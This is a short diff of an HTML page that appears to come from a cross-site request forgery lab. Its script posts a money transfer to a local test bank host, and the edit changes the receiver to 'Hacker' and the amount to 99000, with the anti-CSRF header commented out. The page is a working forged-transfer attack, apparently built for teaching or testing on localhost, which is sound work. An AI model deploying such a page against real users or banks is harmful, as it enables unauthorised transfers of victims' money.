@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Money Get for free</title>
+    <title>Money Transfer</title>
     <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
 </head>
 <body>
@@ -18,8 +18,8 @@
         console.log(accessToken);
 
         axios.post('http://bank.banklord.localhost:11000/transfer', {
-            receiver: "Bob",
-            amount: 100000
+            receiver: "Hacker",
+            amount: 99000
         },{ headers: {
                 'Content-Type': 'application/json',
          //       'X-XSRF-TOKEN': csrfToken,
